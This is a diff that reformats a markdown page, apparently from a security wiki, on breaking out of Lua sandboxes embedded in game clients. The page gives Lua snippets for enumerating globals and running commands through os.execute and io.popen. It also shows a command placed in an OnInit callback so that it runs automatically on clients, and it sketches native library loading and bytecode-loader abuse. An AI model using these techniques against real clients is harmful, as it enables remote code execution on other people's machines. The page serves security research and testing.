@@ -1,6 +1,5 @@
 # Bypass Lua sandboxes (embedded VMs, game clients)
 
-
 This page collects practical techniques to enumerate and break out of Lua "sandboxes" embedded in applications (notably game clients, plugins, or in-app scripting engines). Many engines expose a restricted Lua environment, but leave powerful globals reachable that enable arbitrary command execution or even native memory corruption when bytecode loaders are exposed.
 
 Key ideas:
@@ -14,7 +13,7 @@ Key ideas:
 - Dump the global environment to inventory reachable tables/functions:
 
 ```lua
--- Minimal _G dumper for any Lua sandbox with some output primitive `out
+-- Minimal _G dumper for any Lua sandbox with some output primitive `out`
 local function dump_globals(out)
   out("=== DUMPING _G ===")
   for k, v in pairs(_G) do
@@ -22,7 +21,7 @@ local function dump_globals(out)
   end
 end
 ```
-```
+
 - If no print() is available, repurpose in-VM channels. Example from an MMO housing script VM where chat output only works after a sound call; the following builds a reliable output function:
 
 ```lua
@@ -41,7 +40,7 @@ function OnMenu(menuNum)
   dump_globals(out)
 end
 ```
-```
+
 Generalize this pattern for your target: any textbox, toast, logger, or UI callback that accepts strings can act as stdout for reconnaissance.
 
 ## Direct command execution if io/os is exposed
@@ -56,7 +55,7 @@ io.popen("calc.exe")
 os.execute("/usr/bin/id")
 io.popen("/bin/sh -c 'id'")
 ```
-```
+
 Notes:
 - Execution happens inside the client process; many anti-cheat/antidebug layers that block external debuggers won’t prevent in-VM process creation.
 - Also check: package.loadlib (arbitrary DLL/.so loading), require with native modules, LuaJIT's ffi (if present), and the debug library (can raise privileges inside the VM).
@@ -70,7 +69,7 @@ function OnInit()
   io.popen("calc.exe") -- or any command
 end
 ```
-```
+
 Any equivalent callback (OnLoad, OnEnter, etc.) generalizes this technique when scripts are transmitted and executed on the client automatically.
 
 ## Dangerous primitives to hunt during recon
@@ -98,7 +97,7 @@ print(g())
 local mylib = package.loadlib("./libfoo.so", "luaopen_foo")
 local foo = mylib()
 ```
-```
+
 ## Optional escalation: abusing Lua bytecode loaders
 
 When load/loadstring/loadfile are reachable but io/os are restricted, execution of crafted Lua bytecode can lead to memory disclosure and corruption primitives. Key facts:
@@ -116,8 +115,8 @@ This path is engine/version-specific and requires RE. See references for deep di
 
 ## References
 
-- [[https://appsec.space/posts/aion-housing-exploit/|This House is Haunted: a decade old RCE in the AION client (housing Lua VM)]]
-- [[https://memorycorruption.net/posts/rce-lua-factorio/|Bytecode Breakdown: Unraveling Factorio's Lua Security Flaws]]
-- [[https://web.archive.org/web/20230308193701/https://lua-users.org/lists/lua-l/2009-03/msg00039.html|lua-l (2009): Discussion on dropping the bytecode verifier]]
-- [[https://gist.github.com/ulidtko/51b8671260db79da64d193e41d7e7d16|Exploiting Lua 5.1 bytecode (gist with verifier bypasses/notes)]]
+- [This House is Haunted: a decade old RCE in the AION client (housing Lua VM)](https://appsec.space/posts/aion-housing-exploit/)
+- [Bytecode Breakdown: Unraveling Factorio's Lua Security Flaws](https://memorycorruption.net/posts/rce-lua-factorio/)
+- [lua-l (2009): Discussion on dropping the bytecode verifier](https://web.archive.org/web/20230308193701/https://lua-users.org/lists/lua-l/2009-03/msg00039.html)
+- [Exploiting Lua 5.1 bytecode (gist with verifier bypasses/notes)](https://gist.github.com/ulidtko/51b8671260db79da64d193e41d7e7d16)
 
